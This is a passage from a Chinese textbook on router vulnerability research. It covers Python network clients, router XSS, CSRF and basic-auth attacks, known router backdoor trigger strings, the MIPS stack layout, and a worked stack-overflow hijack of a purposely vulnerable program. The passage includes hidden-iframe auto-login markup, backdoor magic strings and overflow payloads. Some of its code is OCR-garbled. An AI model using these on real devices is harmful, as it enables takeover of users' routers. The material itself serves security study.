远程漏洞利用和其他类型的网络工具经常使用 Python 编写。因为 Python 提供了丰富的网络编程接口，不仅包含底层 Socket 套接字编程，还有高级的 HTTP 请求封装，以及 FTP、Telnet 等，所以，使用 Python 可以快速开发远程漏洞利用测试程序。本书中的漏洞利用测试代码和一些小工具都是采用 Python 编写的。

# 1. Socket编程

下面通过一个简单的客户端编写实例介绍如何使用 Socket 编写网络应用。在 Ubuntu 中使用 nc 命令绑定监听 1234 端口，以模拟服务器，命令如下。

##### 源码 Socket 客户端 client.py

client connect to server
#
import socket
addr = ('127.0.0.1', 1234)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(addr)
sock.send("Hello server!\\n\\nyour command: ")
data = sock.recv(1024)
print ['*] Recv command: ',data
sock.close()

运行客户端 client.py，如图 3-37 所示。

 </div>

# 2. HTTP客户端

Python 提供了多个可以进行 HTTP 访问的库，如 urlib、urllib2、httplib 及 httplib2。接下来，我们就使用这些库编写 HTTP 客户端，以获取 Web 资源。

##### 源码 使用 urlib 和 urlib2 的客户端

1 #
2 # usage: python urlhttp.py [url]
3 #
4 import urlib, urlib2
5 import sys

url = 'http://' + sys.argv[1]
header = {"User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN)}\n
rv:1.9$

"Accept": "text/plain"
req = urllib2.Request(url, headers = header)
try:
    response = urllib2.urlopen(req)
    data = response.read()
except urllib2.HTTPError as e:
    print 'http error code:' , e.code
    exit(0)
if data is not None:
    print data

现在我们就可以通过上面的脚本获取网上的资源了。访问 www.baidu.com，将返回数据保存到 a.html 中，命令如下。

embedded@ubuntu:~/code$ python urlhttp.py www.baidu.com > a.html

用浏览器打开返回的数据 a.html，如图 3-38 所示。可以看到，我们已经使用脚本获取了百度首页的代码。

 </div>

接下来，我们使用 httplib 和 urlib 实现一个 HTTP 客户端。这里重点介绍 POST 方法中 POST 数据的组织，命令如下。

import httplib, urllib

params = urllib.urlencode({ 'username': 'admin', 'password': 'admin888' })
headers = {'Content-Type': "application/x-www-form-urlencoded", 'Accept': 'text/plain'}
conn = httplib.HTTPConnection("127.0.0.1:80")
conn.request("POST", "index.php", params, headers)
response = conn.getresponse()
print response.status, response.reason
print response.read()
conn.close()

运行以上代码，相当于访问 http://127.0.0.1/index.php，访问的 POST 数据是 “username=admin&password=admin888”，如图 3-39 所示。

 </div>

### 第 2 篇 路由器漏洞原理与利用

### 第 4 章 路由器 Web 漏洞

家用路由器一般带有 Web 管理服务，使用者可以通过 Web 管理界面进行路由器的管理和配置。跨站（XSS）、CSRF（Cross-Site Request Forgery）、基础认证等针对 Web 漏洞的攻击，不仅可以运用在针对网站的攻击上，同样可以运用在针对路由器的攻击中。

## 4.1 XSS漏洞

为了不与层叠样式表（Cascading Style Sheets）的缩写“CSS”混淆，故将跨站脚本攻击（Cross Site Scripting）缩写为“XSS”。

#### 4.1.1 XSS简介

跨站攻击是指入侵者在远程 Web 页面的 HTML 代码中插入具有恶意目的的数据，用户认为该页面是可信赖的，但是当浏览器下载该页面时，嵌入其中的脚本将被解释执行。由于 HTML 语言允许使用脚本进行简单交互，所以攻击者可以通过技术手段在某个页面中插入一段恶意 HTML 代码。

例如，Cookie 中保存了完整的用户名和密码，用户就会遭受安全损失。“alert(document.cookie)”这句简单的 JavaScript 脚本能轻易获取用户信息，它会弹出一个包含用户信息的消息框，入侵者通过脚本把用户信息发送到他们自己的记录页面中，稍做分析便能获取用户的敏感信息。

#### 4.1.2 路由器XSS漏洞

前面曾经提到，家用路由器一般带有 Web 管理服务，使用者可通过 Web 管理界面进行路由器的管理和配置。既然路由器管理页面是一个网站，那么 XSS 自然可以用在路由器攻击中。例如，攻击者发现路由器网页中包含一个反射型 XSS，就可以构建一个利用这个 XSS 漏洞的 URL，并将其通过邮件或 OO 消息发送给受害者，引诱受害者点击这个 URL，从而访问

路由器网页。受害者点击 URL 后，恶意代码就会在浏览器中执行，它可以将路由器网页的会话 Cookie 发送给攻击者，攻击者在受害者不知情的情况下通过 Cookie 盗取敏感信息或更改路由器设置，流程如图 4-1 所示。

 </div>

## 4.2 CSRF漏洞

下面介绍 CSRF 漏洞的相关内容。

#### 4.2.1 CSRF简介

Cross-Site Request Forgery（跨站请求伪造，也称“One Click Attack”或“Session Riding”），通常缩写为“CSRF”或“XSRF”，是一种对网站的恶意利用。尽管听起来像XSS，但它与XSS有很大的区别，且攻击方式几乎相左。XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求达到利用受信任的网站的目的。与XSS攻击相比，CSRF攻击不太流行（因此对其进行防范的资料也非常少）且难以防范，所以被认为比XSS更具危险性。

#### 4.2.2 路由器CSRF漏洞

就像路由器 XSS 漏洞一样，只要存在网页，就有可能实现 CSRF 攻击。CSRF 攻击相较于 XSS 能够直接修改路由器参数，使目标长期被监控，危害更大，也更隐蔽。

我们举个例子来解释 CSRF 的攻击原理，如图 4-2 所示。攻击者构造了一个针对路由器的 CSRF 链接，欺骗受害者点击该链接，其功能是修改路由器 DNS 为一个伪造的 DNS 服务器。之后，受害者访问正常网页时，因为 DNS 劫持而将所有网络访问数据发送给攻击者。攻击者监控受害者的所有网络访问行为，受害者却毫不知情。

 </div>

## 4.3 基础认证漏洞

下面介绍基础认证漏洞的相关内容。

#### 4.3.1 基础认证漏洞简介

早先的 IE 6.0 浏览器，以及现在的 Chrome、Firefox 浏览器，都可以使用一种比较特殊的 URL 访问方法实现路由器认证（http://admin:admin@192.168.0.1）。通过这种方法，只要知道用户名和密码，就可以不用手工输入用户名和密码完成路由器的直接认证和跳转。

通过以上两个条件，攻击者便可构造出可跨站的方法。可以采取让用户点击超链接、浏览器自动请求资源的方法，如使用“<img>”标签，示例如下。

<img src="http://admin:admin@192.168.0.1">

使用 “<iframe>”、“</iframe>” 标签实现起来更加方便、隐蔽，示例如下，效果如图 4-3 所示。

<iframe src=http://admin:admin@192.168.0.1 width=0 height=0 frameborder=0>

</iframe>

 </div>

#### 4.3.2 路由器基础认证漏洞

XSS 和 CSRF 攻击的前提都是受害者已经登录路由器。如果受害者没有登录路由器，那么即使 XSS 和 CSRF 攻击成立，也无法获取和修改路由器参数。基础认证漏洞可以使未登录状态瞬间变为已登录状态，从而结合 XSS 和 CSRF 对路由器进行进一步攻击。

大部分家用路由器都是采用基础认证的登录方式验证路由器管理员账号的。利用这个特性，攻击者可以构造一个网页欺骗受害者点击，受害者点击后，网页脚本利用路由器基础认证漏洞进行登录操作，使受害者在不知情的情况下登录路由器的管理页面。

攻击网页附带了 XSS 和 CSRF 攻击的脚本代码，以获取路由器敏感信息和设置路由器参数，从而对路由器进行持续的监控，其执行效果如图 4-4 所示。

 </div>

### 第 5 章 路由器后门漏洞

2014 年国家互联网应急中心发布的报告显示：D-Link、Cisco、Linksys、NETGEAR、Tenda 等多家厂商的路由器产品存在后门，攻击者可由此直接控制路由器，进一步发起 DNS 劫持、窃取信息、网络钓鱼等攻击行为，直接威胁用户网上交易和数据存储的安全。这再次引起人们对路由器后门及路由器安全的巨大关注。

## 5.1 关于路由器后门

在信息安全领域，后门是指绕过安全控制而获取对程序或系统访问权的方法。路由器在家庭网络中有着至关重要的地位，其自然也成了攻击者眼中的“香饽饽”。目前，市面上大多数品牌的路由器已具备了较强的安全防护功能和设置，攻击者要进行攻击已非易事。但是，在安全信息系统设计原则中，有一条叫做“木桶原则”，即要对信息均衡、全面地进行保护。“木桶的最大容积取决于最短的一块木板”，攻击者必然会对系统中最薄弱的地方进行攻击。即使某一款路由器拥有完美的安全防护功能和设置，可是却保留了一条不为人知的秘密通道，如果被攻击者发现，攻击者同样可以轻松进入并获取控制权限。这时，再完美的安全防护都已形同虚设。

在路由器的“后门”，有的是为了开发人员管理和控制路由器而留；有的是发布时遗留的安全漏洞；有的或许是厂商对路由器调试的高级接口登录设置认证过于简单，攻击者趁虚而入造成的安全漏洞；还有的或许是有人蓄意而为。漏洞的成因不在本书的讨论范围之内，本书仅将可以绕过安全控制而获取路由器访问权的漏洞统一称为路由器后门漏洞。

## 5.2 路由器后门事件

在过去的一段时间里，触目惊心的大品牌路由器陆续曝出“后门”事件，波及范围很广，覆盖 Cisco、D-Link、Tenda、Linksys、NETGEAR、netcore 等国内外多家厂商。频繁曝出的“后门”事件的严重程度远超人们的想象。接下来，我们一起了解一下那些著名的后门安全漏洞。

#### 5.2.1 D-Link路由器后门漏洞

问题描述：如果浏览器 User Agent String 中包含特殊字符串 “xmlset_roodkcableoj28840 ybtide”，攻击者将可以绕过密码验证直接访问路由器的 Web 界面，进而浏览和修改设置。

受影响型号：DIR-100、DIR-120、DI-524、DI-524UP、DI-604S、DI-604UP、DI-604+、TM-G5240、BRL-04R、BRL-04UR、BRL-04CW、BRL-04FWU。

#### 5.2.2 Linksys TheMoon蠕虫

问题描述：黑客向存在漏洞的 Linksys 路由器发送一段 Shell 脚本，使路由器感染 TheMoon 蠕虫，受感染的路由器会扫描其他 IP 地址。这个蠕虫内置了大约 670 个位于不同国家的家用网段，被感染的路由器在短时间内会作为 HTTP 服务器供其他被感染的路由器下载蠕虫代码。

受影响型号：E4200、E3200、E3000、E2500、E2100L、E2000、E1550、E1500、E1200、E1000、E900、E300、WAG320N、WAP300N、WAP610N、WES610N、WET610N、WRT610N、WRT600N、WRT400N、WRT320N、WRT160N、WRT150N 等。

#### 5.2.3 NETGEAR路由器后门漏洞

# 1. NETGEAR多款路由器存在后门漏洞

问题描述：NETGEAR 生产的多款路由器存在后门。该后门为厂商设置的超级用户和口令，攻击者可利用该后门在相邻网络内获取路由器的 root 权限，进而植入木马，完全控制用户的路由器，后续还可发起 DNS 劫持攻击。

受影响型号：WNDR3700、WNDR4500、WNDR4300、R6300 v1、R6300 v2、WNDR3800、WNDR3400 v2、WNR3500L、WNR3500L v2、WNDR3300。

# 2. NETGEAR DGN2000 Telnet后门未授权访问漏洞

问题描述：NETGEAR DGN2000 路由器的 TCP 端口 32764 上监听的 Telnet 服务部分没有归档，存在安全漏洞，成功利用后可导致执行任意 OS 命令。

受影响型号：DGN2000。

#### 5.2.4 Cisco路由器远程特权提升漏洞

问题描述：由于受影响设备在 TCP 32764 端口存在一个未文档化的测试接口，攻击者可访问设备的 LAN 端接口。该漏洞可导致路由器允许未经验证的远程攻击者获得对设备的 root 级访问权限，并执行任意命令。

受影响型号：WRVS4400N Wireless-N Gigabit Security Router 1.0、WRVS4400N Wireless-N Gigabit Security Router 1.1、RVS4000 4-port Gigabit Security Router 1.3.2.0、RVS4000 4-port Gigabit Security Router 2.0.2.7、RVS4000 4-port Gigabit Security Router 1.3.3.5、WRVS4400N Wireless-N Gigabit Security Router 2.0.2.1。

#### 5.2.5 Tenda路由器后门漏洞

# 1. Tenda无线路由器远程命令执行后门漏洞

问题描述：Tenda 的 W330R、W302R 无线路由器固件的最新版本及 Medialink MWN-WAPR150N 中存在后门。该漏洞通过一个 UDP 数据包即可利用。如果设备收到以字符串 “w302r_mfg” 开头的数据包，即可触发此漏洞并执行各类命令，甚至以 root 权限执行任何命令。

受影响型号：W330R、W302R。

# 2. Tenda W309R无线路由器漏洞可绕过管理员认证

问题描述：Tenda W309R 路由器尽管在登录时要求密码访问，但由于 Cookie 管理机制的脆弱性，仍导致不需要提供密码即可访问 Web 管理界面的情况。

受影响型号：W309R。

#### 5.2.6 磊科全系列路由器后门

问题描述：磊科（netcore）路由器内置了一个叫做 IGDMTPTD 的程序，按照描述应该是 IGD MPT Interface daemon 1.0。该程序会随路由器启动，并在公网上开放端口，攻击者可以利用该程序执行任意系统命令、上传/下载文件、控制路由器。

受影响型号：全系列。

### 第 6 章 路由器溢出漏洞

本章所介绍的内容是路由器漏洞研究的核心内容之一——缓冲区溢出漏洞。

缓冲区溢出漏洞是一种非常普遍且危险的漏洞，在各种操作系统、应用软件中广泛存在，在路由器中也不例外。利用缓冲区溢出攻击，可以造成程序运行失败、系统宕机、重新启动等后果。更为严重的是，利用缓冲区溢出攻击执行非授权指令，可以取得系统特权，进而进行各种非法操作。本章将介绍路由器溢出漏洞的基本原理，并通过实践讲解路由器缓冲区溢出漏洞利用的基本方法。

## 6.1 MIPS堆栈的原理

在计算机科学中，栈是一种具有先进后出（FILO）队列特性的数据结构。调用栈（Call Stack）是指存放某个程序正在运行的函数的信息的栈。调用栈由栈帧（Stack Frames）组成，每个栈帧对应一个未完成运行的函数。

在当今流行的 x86 计算机体系结构中，大部分编译器对函数中的参数传递、局部变量分配和释放都是通过操纵程序栈实现的。栈用于传递函数参数、存储返回值信息、保存寄存器，以恢复调用前处理机的状态。MIPS32 架构的函数调用时对栈的分配和使用方式与 x86 架构有相似之处，但又有很大的区别。本节将详细讨论 MIPS32 架构下的函数调用与栈的原理。

#### 6.1.1 MIPS32架构堆栈

与传统 PC 采用的 x86 架构复杂指令系统不同，大多数采用 Linux 嵌入式操作系统的路由器使用的是 MIPS 指令系统，该指令系统属于精简指令系统（如没有特殊说明，后文中的“MIPS32 架构”均指“MIPS 指令集系统”）。MIPS32 架构的函数调用方式与 x86 系统有很大的差别，具体体现在以下方面。

栈操作：MIPS32 架构堆栈与 x86 架构一样，都是向低地址增长的。但在 MIPS32 架构中没有 EBP（栈底指针），进入一个函数时，需要将当前栈指针向下移动 n 比特，这个大

小为 n 比特的存储空间就是此函数的 Stack Frame 的存储区域。此后，栈指针便不再移动，只能在函数返回时将栈指针加上这个偏移量恢复栈现场。由于不能随便移动栈指针，所以寄存器压栈和出栈时都必须指定偏移量。

调用：如果函数 A 调用函数 B，调用者函数（函数 A）会在自己的栈顶预留一部分空间来保存被调用者（函数 B）的参数，我们称之为调用参数空间。

参数传递方式：前 4 个传入的参数通过 $a0~$a3 传递。有些函数的参数可能会超过 4 个，此时，多余的参数会被放入调用参数空间。x86 架构下的所有参数都是通过堆栈传递的。

返回地址：在 x86 架构中，使用 call 命令调用函数时，会先将当前执行位置压入堆栈，MIPS 的调用指令把函数的返回地址直接存入 $RA 寄存器而不是堆栈中。

#### 6.1.2 函数调用的栈布局

首先介绍 MIPS32 架构下关于函数的两个概念——叶子函数和非叶子函数。如果一个函数 A 中不再调用其他任何函数，那么当前的函数 A 就是一个叶子函数，否则函数 A 就是一个非叶子函数。

# 1. 函数调用过程

当函数 A 调用函数 B 时，MIPS32 架构下子函数的调用步骤如下（在汇编语言级别讨论）。

01 在函数 A 执行到调用函数 B 的指令时，函数调用指令复制当前的 SPC 寄存器的值到 SRA 寄存器，即当前 SRA 的值就是当前函数执行结束的返回地址，然后跳转到函数 B 并执行。

02 程序跳转到函数 B 以后，如果函数 B 是非叶子函数，则函数 B 首先会把函数 A 的返回地址（此时返回函数 A 的地址存放在 $RA 寄存器中）存入堆栈，否则返回函数 A 的地址仍然在 $RA 中。

03 函数返回时，如果函数 B 是叶子函数，则直接使用 “jr $ra” 指令返回函数 A，这里的寄存器 $RA 指向返回地址。如果函数 B 是非叶子函数，返回过程相对来说复杂一点，函数 B 先从堆栈中取出被保存在堆栈上的返回地址，然后将返回地址存入寄存器 $RA，再使用 “jr $ra” 指令返回函数 A。

# 2. 函数调用参数传递

MIPS 体系的函数调用，通过 $a0~$a3 传递前 4 个参数，其他参数通过栈传递。通常情况下，其函数栈帧的组织如图 6-1 所示。

 </div>

下面通过一个例子展示 MIPS32 架构下函数的参数传递及堆栈布局的变化。

源码 more_argument.c

1 //more_argument.c
2 #include <stdio.h>
3 int more_arg(int a, int b, int c, int d, int e)
4 {
5     char dst[100] = {0};
6     sprintf(dst, "%d%d%d%d\n", a, b, c, d, e);
7 }
8 void main()
9 {
10     int a1 = 1;
11     int a2 = 2;
12     int a3 = 3;
13     int a4 = 4;
14     int a5 = 5;
15     more_arg(a1, a2, a3, a4, a5);
16     return ;
17 }

在第 15 行中，more_arg() 函数拥有 5 个参数，根据调用约定，a0～a3 这 4 个寄存器已经不能满足参数的传递，因此，需要使用栈保存第 5 个参数。

先看看在执行第 14 行代码之后，执行第 15 行调用 more_arg() 函数之前，堆栈的布局和寄存器（a0～a3）的状态，如图 6-2 所示。main() 函数会将 more_arg() 函数的前 4 个参数分别存

入寄存器 a0～a4，将第 5 个参数保存到在 main() 函数栈顶预留调用参数的空间中。在这里，虽然内存中不需要保留前 4 个参数，但可以看到 main() 函数仍然预留了前 4 个参数的内存空间。

##### 图6-2

接下来，我们从汇编代码层面看看函数调用过程中都发生了什么。main() 函数分配临时变量 v_a1～v_a5，但是需要注意，arg_a5 被当作 more_arg 的第 5 个参数，如图 6-3 所示。

 </div>

从上面的汇编代码可以看出；在执行 more_arg() 函数（“jal more_arg”命令）之前，将 more_arg() 函数需要的 5 个参数分别保存到堆栈临时变量 var_a1、var_a2、var_a3、var_a4、var_a5 中，然后将前 4 个参数按照调用约定加载到 a0～a4 中，将第 5 个参数从临时变量中取出，存储到 main() 函数预留的调用参数空间中。至此，5 个参数准备就绪。

进入 more_arg() 函数，执行到调用 sprintf 函数调用（0x0040041C）之前，如图 6-4 所示。

 </div>

此时，栈中的状态如图 6-5 所示。

 </div>

在 more_arg() 函数分配栈空间以后，more_arg() 函数会先将 a0~a4 复制到 main() 函数栈

帧预留的调用参数空间中（图 6-5 中 main 栈帧的斜线阴影部分）。当指令执行到 sprintf 函数时，sprintf 函数的调用需要 7 个参数，同样需要借助堆栈进行参数传递。此时，more_arg() 函数的操作仍然是将前 4 个参数分别存入 a0～a4，然后把剩余的 3 个参数保存到 more_arg() 函数自己的调用参数空间中（图 6-5 中 more_arg 栈帧的斜线阴影部分）。

#### 6.1.3 利用缓冲区溢出的可行性

在 MIPS 体系结构中，函数分为两种，即叶子函数和非叶子函数。MIPS 函数的调用过程与 x86 不同。在 x86 的体系结构下，函数 A 调用函数 B 时，总是先将函数 A 的地址压入堆栈，在函数 B 执行完毕返回 A 函数时，再从堆栈中弹出返回函数 A 的地址，然后返回函数 A 继续执行。我们知道，MIPS32 架构下的函数调用指令不会把返回地址存入堆栈，而是直接存入寄存器 $RA 中。那么，在 MIPS32 架构下缓冲区溢出是否能够被利用？接下来我们就通过两个例子探讨在 MIPS32 架构下利用缓冲区溢出是否具有可行性。

##### 案例1：非叶子函数

has_stack() 函数内调用了 strcpy 函数，因此，has_stack 是非叶子函数，返回 main() 函数的地址会首先保存到寄存器 $ra 中，进入 has_stack() 函数以后，has_stack 会把返回 main() 函数的返回地址保存在 has_stack 的堆栈中，在 has_stack() 函数返回 main() 函数继续执行时，将保存在堆栈中的返回 main() 函数的返回地址写入 $ra 并返回 main() 函数继续执行，代码如下。

源码 subcall_stack.c

1 // subcall_stack.c
2 #include <stdio.h>
3 void has_stack(char *src)
4 {
5     char dst[20] = {0};
6     strcpy(dst, src); // 函数调用
7 }
8 void main(int argc, char *argv[])
9 {
10     has_stack(argv[1]);
11 }

按照如下命令进行编译。

$ mips-linux-gcc subcall_stack.c -static -o subcall_stack

使用 IDA 进行反汇编，如图 6-6 所示。

 </div>

has_stack() 函数执行完第 2 条指令 “sw $ra, 0x38+saved_ra” 后堆栈的情况如图 6-7 所示。虽然函数调用指令不再直接将返回 main() 函数的返回地址保存到堆栈中，而是将返回地址写入 $ra 中，但由于 has_stack() 函数要调用 sprintf 函数，所以 has_stack 将返回 main() 函数的返回地址 0x0040042C 保存到 has_stack 栈帧底部（如代码中的 0x00400394 代码行）。当函数返回时，会先从堆栈中取出返回地址 0x0040042C 并将其存放到寄存器 $ra 中（如代码中的 0x004003E8 代码行）。如果 has_stack() 函数的局部变量中国存在缓冲区溢出漏洞，就可能导致堆栈上返回 main() 函数的返回地址被覆盖，has_stack 取出的返回 main() 函数的返回地址不再是 0x0040042C，而是由攻击者精心构造的数据。因此，在这种情况下缓冲区溢出是可以被利用的。

揭秘家用路由器 0day 漏洞挖掘技术

##### 图6-7

案例2：叶子函数

#include <stdio.h>
void no_stack(char *src, int count)
{
    char dst[20] = {0};
    int i = 0;
    for (i = 0; i < count; i++)
    {
        dst[i] = src[i];
    }
}
void main(int argc, char *argv[])
{
    int count = strlen(argv[1]);
    no_stack(argv[1], count);
}
运行如下命令编译该程序。
$ mips-linux-gcc subcall_nostack.c -static -o subcall_nostack

使用 IDA 加载 subcall_nostack 查看反汇编代码，其反汇编代码如图 6-8 所示。main() 函数调用 no_stack() 函数时，返回 main() 函数的返回地址并不是直接存入堆栈中的，而是存储到寄

存器 $ra 中的，在 no_stack() 函数的函数体 0x00400414 之前，我们看不到任何指令对寄存器 $ra 进行了操作，0x00400414 的指令 “jr $ra” 就直接返回 main() 函数，继续执行 main() 函数中的代码。可以看到，因为我们使用的缓冲区都在内存中，无法操作寄存器 $ra，所以即使 no_stack() 函数体中存在缓冲区溢出，也是没有办法覆盖返回 main() 函数的返回地址的。

 </div>

但是，这并不代表叶子函数中的缓冲区溢出就完全无法利用。如果缓冲区溢出覆盖的区域足够大，no_stack() 函数中的缓冲区溢出是有可能覆盖 main() 函数的栈帧的，这样就可能覆盖 main() 函数栈帧中存放的上层函数的返回地址。因此，当非叶子函数中存在缓冲区溢出漏洞时，程序的执行流程是存在被劫持的可能性的。

综上所述，只要函数中存在非叶子函数，并且有缓冲区溢出漏洞，就可以覆盖某一个函数的返回地址，从而劫持程序执行流程；而在叶子函数中，如果存在可以溢出大量数据的情况，就存在通过覆盖父函数中的返回地址利用缓冲区溢出漏洞的可能性。

因此，在 MIPS32 体系中，栈溢出利用依然是可行的。

## 6.2 MIPS缓冲区溢出

缓冲区（不作特殊说明时，以下所指皆为栈空间缓冲区）是用于在内存中存储数据的内存区域。例如，源码 sub_stack.c 中的 “char dst[20];” 就是在内存中申请 20 字节用于存放字符型数据的缓冲区。

简单地说，缓冲区溢出就是在大缓冲区数据向小缓冲区复制的过程中，由于没有检查小缓冲区的边界或者检查不严格，导致小缓冲区明显不足以接收整个大缓冲区的数据，超出的部分覆盖了与小缓冲区相邻的内存区中的其他数据而引发的内存问题。

成功利用缓冲区溢出可能造成严重的后果，基本上可以分 3 种情况，分别是拒绝服务、获得用户级权限、获得系统级权限。需要说明的是，即便是同一个漏洞，在不同的人手里，这 3 种情况都有可能出现。因为每个人利用漏洞的经验不同，所以，对于利用条件极为苛刻的漏洞，有的人可能只作为拒绝服务使用，而有的高手却可以突破限制，获得用户级甚至系统级权限。

#### 6.2.1 Crash

下面是一段存在漏洞的程序源码，功能比较简单：从文件 passwd 中读取密码，如果密码为“adminpwd”即有权限执行系统命令“ls -l”列出当前目录，否则提示密码错误后直接退出。

源码 vuln_system.c

1 //vuln_system.c
2 #include <stdio.h>
3 #include <sys/stat.h>
4 #include <unistd.h>
5 void do_system(int code, char *cmd)
6 {
    char buf[255];
    //sleep(1);
    system(cmd);
}

11 void main()
12 {
    char buf[256]={0};
    char ch;
    int count = 0;
}

16 unsigned int fileLen = 0;
17 struct stat fileData;
18 FILE *fp;
19 if(0 == stat("passwd", &fileData))
20     fileLen = fileData.st_size;
21     else
22         return 1;
23     if((fp = fopen("passwd", "rb")) == NULL)
24         {
25             printf("Cannot open file passwd!\n");
26             exit(1);
27         }
28     ch=fgetc(fp);
29     while(count <= fileLen)
30         {
31             buf[count++] = ch;
32             ch = fgetc(fp);
33         }
34         buf[--count] = '\x00';
35         if(!strcmp(buf,"adminpwd"))
36         {
37             do_system(count,"ls -l");
38         }
39         else
40         {
41             printf("you have an invalid password!\n")
42             }
43         fclose(fp);
45 }

使用以下命令编译并运行该程序。

$ mips-linux-gcc vuln_system.c -static -o vuln_system
$ python -c "print 'A'*600" > passwd //写600个“A”到passwd文件中
$ gemu-mips vuln_system

运行后输出的内容如下。

you have an invalid password!
qemu: uncaught target signal 11 (Segmentation fault) - core dumped
Segmentation fault (core dumped)

程序的运行引发了一段故障（Segmentation Fault）提示。使用如下命令重新执行 vuln

system，然后通过 IDA 附加 vuln_system 进程，调试端口设置为 1234。

$ qemu-mips vuln_system `python -c "print 'A'*600"`

使用 IDA 附加 vuln_system 进程后，在 IDA 中按 “F5” 键运行，崩溃现场如图 6-9 所示。可以看到，程序在试图执行 0x41414141 处的指令时发生了崩溃，这刚好是 AAAA 的十六进制（A 的十六进制为 0x41）。0x41414141 超出了进程段地址空间，引发了段故障错误。

 </div>

#### 6.2.2 劫持执行流程

在 6.2.1 节中输入的数据不仅引发了崩溃事件，而且完全劫持了程序的执行流程，让原本正常返回的程序跳转到指定的 0x41414141 处继续执行。接下来，我们通过静态和动态方式精确定位，劫持执行流。

通过阅读 vuln_system.c 的源码可以知道，main() 函数读取 passwd 文件后，将文件中的所有内容存入堆栈的局部变量 buf 中，buf 仅为 256 字节，而 passwd 文件有 600 字节的数据写入 buf，导致了缓冲区溢出。main() 函数中的临时变量组织如图 6-10 所示。

通过静态分析发现，如果要使缓冲区溢出，并控制到堆栈中的返回地址 saved_ra，需要覆盖的数据大小应该达到  $ 0 \times 1A0 - 0 \times 4 $ 即  $ 0 \times 19C $ 字节。下面我们通过调试进行验证。

使用以下命令执行 vuln_system 程序，填充 0x19C 字节的数据以后，应该将执行流劫持到 0x42424242（BBBB）处执行。

$ python -c "print 'A'\*0x19C+\'BBBB'\+'CCCC'" > passwd

$ qemu-mips -g 1234 vuln_system

 </div>

然后，使用 IDA 附加该进程，在 0x004004E4 处下断点，此时还没有进入读取文件循环，如图 6-11 所示。

 </div>

按 “F5” 键运行程序，当程序在 0x004004E4 行断下时，将汇编窗口跳转到 main() 函数的最后，即 0x004005D8 行，如图 6-12 所示。

周，应用略图000，属河包强度木

004005D8
004005D8 loc_4005D8:
004005D8 move $sp, $fp
004005DC lw $ra, 0.1C+saved_ra($sp)
004005E0 lw $fp, 0.1C+saved_fp($sp)
004005E4 addiu $sp, 0.1C$
004005E8 jr $ra
004005EC nop
004005EC

 </div>

双击 0x004005DC 行 “saved_ra”，来到保存返回地址在栈空间 0x40800614 处，如图 6-13 所示。

 </div>

在 “Hex View-1” 窗口使用快捷键 “G” 查看 0x40800614 处的内存，如图 6-14 所示。

 </div>

单击 0x0040053C 行的代码，按 “F4” 键让程序执行到 0x0040053C 行停止，如图 6-15 所示。

我们再来看 “Hex View-1” 窗口，返回地址已经被覆盖为 0x42424242，如图 6-16 所示。此时，缓冲区已经被输入的数据覆盖，并且越界后覆盖了堆栈上的其他数据。

 </div>

 </div>

按 “F4” 键让程序执行到 0x004005E8 行的返回指令处，此时寄存器的状态如图 6-17 所示。可以看到，返回地址寄存器 $RA 已经被覆盖为 0x42424242。

 </div>

按 “F8” 键执行指令 “jr $ra”，程序就会跳转到 0x42424242 处执行，如图 6-18 所示。

 </div>

通过对栈帧的运算，我们已经能够确定程序 vuln_system 从 passwd 文件中读取 0x19C 字节的数据后，再读入 4 字节的数据（BBBB）即可精确控制程序计数器 $PC，从而劫持程序执行流程。

## 6.3 MIPS缓冲区溢出利用实践

本节给出一些 MIPS 缓冲区溢出的利用实践。

#### 6.3.1 漏洞攻击组成部分

通常情况下，在漏洞攻击中布置缓冲区，需要 NOP 区及覆盖在 NOP 区后面的 Shellcode 等部分，如图 6-19 所示。

当触发漏洞并控制返回地址以后，只要能够使程序跳转到 NOP 区内执行，最终都会执行 NOP 区后面布置的 Shellcode。但要注意，并不是所有的缓冲区布置都必须由这几个部分组成，需要根据具体漏洞选择合适的利用方法。

 </div>

# 1. NOP Sled

在汇编代码中，NOP 指令意味着该指令不进行任何操作，对程序流程没有影响。使用 NOP 指令的好处在于将返回地址作为一个缓冲，只要 PC 能够落在 NOP 区内的任意位置，Shellcode 就能成功执行。

很不幸，在 MIPS 中，NOP 指令的机器码是 0x00000000，如果使用 NOP 实现跳转缓冲，会影响以 0x00 截断的字符串复制函数，如 strcpy 函数。实际上，宏观的 NOP 指令可以被认为：一切不影响 Shellcode 执行的指令都可以作为 NOP 指令在组织缓冲区时进行填充。从如图 6-19 所示的 Shellcode 中可以看出，$a2 的值不会影响 Shellcode 的执行，因为在 Shellcode 中，无论如何 $a2 都会被赋值为 0，因此，寄存器可以对与 $a2 相关的指令进行 NOP，如 “lui $a2,0x0202” 的机器码为 0x3C060202。

即便如此，仍然有利用失败的可能性。因为 MIPS 指令是定长的，所以每条指令固定占用 4 字节，如果刚好跳转到 02023C06 处，那么执行的指令就变成了一条无效指令。在布置缓冲区时需要注意这一点。

# 2. ROP Chain

ROP（Return-Oriented Programming）是把原来已经存在的代码块拼接起来，拼接时使用一个预先准备好的、包含各条指令结束后下一条指令的地址的特殊的返回栈。一般的程序里都包含着大量的返回指令，如“jr $ra”，它们大都位于函数的尾部，或者函数中部需要返回的地方。从某个地址到“jr $ra”指令之间的二进制序列称为 gadget，如图 6-20 所示。

 </div>

这些二进制指令序列使其组合完成如读写内存、算术逻辑运算、控制流程跳转、函数调用等操作。因此，我们可以通过使内存空间中的各个 gadget 以某种顺序执行来实现任意操作。

为了将各个 gadget “拼接” 起来，我们需要构造一个特殊的返回栈。首先，让指向我们构造的栈的指针跳到 gadget A 中，在执行完 gadget A 中的代码序列后，通过位于 gadget A 尾部的 jr $ra 回我们的栈中，然后跳到 gadget B，执行后跳到 gadget C……只要栈足够大，就能达到我们想要的效果，如图 6-21 所示。

 </div>

ROP 难以构造的地方在于，我们要在整个内存空间中搜索需要的 gadget，这要花费很长时间。一旦完成 “搜索” 和 “拼接”，这样的攻击将是难以抵挡的，因为它使用的都是内存中的合法代码。

值得注意的是，ROP 具备图灵完整性，也就是说，如果程序能实现，ROP 就肯定有一个对应的序列及堆栈。这给了 ROP 极大的利用空间。绝大多数大型程序，通过 ROP 一般可以构造一个完整的 ROP 序列。在 6.3.2 节中将介绍如何构造 ROP Chain 实现缓冲区漏洞的利用。

# 3. Shellcode

Shellcode 是指专门用于执行一定功能的机器代码。其实，Shellcode 是因 “攻击者使用这段 Code 提供一个简单的 Shell” 而得名的。随着技术的不断发展，Shellcode 已不仅仅提供 Shell 的简单功能，它几乎可以实现任意功能。

